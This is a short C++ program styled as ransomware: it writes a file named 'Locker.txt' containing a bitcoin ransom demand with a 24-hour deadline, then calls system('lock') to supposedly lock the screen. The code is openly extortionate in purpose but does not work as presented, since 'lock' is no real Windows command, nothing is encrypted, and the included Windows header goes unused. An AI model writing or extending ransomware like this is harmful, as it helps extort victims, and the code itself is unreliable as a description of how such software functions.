#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

const char* LockerFilename = "Locker.txt";

void CreateLocker() {
    ofstream file(LockerFilename);
    string text = R"(Your computer is locked! To regain access, pay a ransom in bitcoin. You have 24 hours before the lock expires.)";
    file << text;
}

void LockScreen() {
    system("lock");
}

int main() {
    CreateLocker();
    LockScreen();

    return 0;
}
